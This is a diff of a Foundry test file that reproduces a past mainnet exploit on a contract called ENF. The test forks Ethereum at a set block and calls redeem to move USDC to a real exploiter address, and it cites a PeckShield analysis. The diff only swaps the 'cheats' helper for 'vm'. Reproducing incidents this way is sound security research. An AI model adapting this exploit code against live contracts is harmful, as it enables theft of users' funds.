@@ -2,7 +2,6 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/peckshield/status/1630490333716029440
@@ -23,17 +22,15 @@ contract ContractTest is Test {
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     address exploiter = 0x8B5A8333eC272c9Bca1E43F4d009E9B2FAd5EFc9;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16_696_239);
+        vm.createSelectFork("mainnet", 16_696_239);
     }
 
     function testExploit() external {
         deal(address(ENF), address(this), 1e18);
-        cheats.startPrank(address(this), address(this));
+        vm.startPrank(address(this), address(this));
         ENF.redeem(676_562, exploiter);
-        cheats.stopPrank();
+        vm.stopPrank();
 
         emit log_named_decimal_uint("Exploiter USDC balance after exploit", USDC.balanceOf(exploiter), USDC.decimals());
     }
